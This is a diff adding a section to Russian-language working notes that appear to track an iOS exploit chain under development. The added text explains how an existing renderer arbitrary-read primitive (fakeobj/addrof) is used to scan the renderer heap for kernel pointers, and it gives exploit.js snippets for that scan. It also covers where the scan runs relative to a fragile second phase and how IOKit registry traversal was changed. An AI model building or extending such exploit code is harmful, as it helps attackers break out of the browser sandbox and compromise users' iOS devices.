@@ -1716,6 +1716,30 @@ GameController/SPU/IDV/HIDTransport/Accessory/Framebuffer/IOGPU/AGX.
 утечкой: она перечисляет сервисы и открывает клиенты по всем найденным
 именам.
 
+
+8.48 БЕРЁМ KERNEL POINTER ИЗ РЕНДЕРА, А НЕ ИЩЕМ В IOKit
+
+dj прав: гонять охоту за утечкой в IOKit - медленно. У нас уже есть
+произвольное чтение В РЕНДЕРЕ (PHASE 1 даёт fakeobj/addrof). Kernel
+указатели лежат в собственной куче рендера (Mach-порты, IPC-буферы,
+shared cache), и верхние 16 бит kernel-адреса на iOS = 0xFFFF.
+
+В exploit.js добавлен скан:
+  window.__kptrHits = [];
+  function isKernelish(v) { return ((v >> 48n) & 0xFFFFn) === 0xFFFFn; }
+  function scanForKernelPtrs(lo, hi, step) {
+      const fake = _fakeobj(a); const raw = _readElement(fake, 0); v = f2i(raw);
+      ... собирает попадания {a, v} ... }
+Вызов стоит сразу после PHASE 1 (до хрупкой PHASE 2), чтобы падение
+v128-утечки не стоило нам утечки:
+  [KPTR] scan lo=0x... hi=0x... reads=N hits=M :: <addr>=<value> ...
+
+Диапазон: heapBase = addrof(executorRef), +/- 0x200000, шаг 0x100.
+
+Плюс попутно: обход реестра в ловушке утечки переведён на ленивый
+IORegistryEntryCreateIterator (IOServiceGetMatchingServices(NULL) убивал
+приложение).
+
 ================================================================================
  4. ПРИОРИТЕТ (обновлено 2026-10-20 21:05, AIO отложен по решению dj)
 ================================================================================
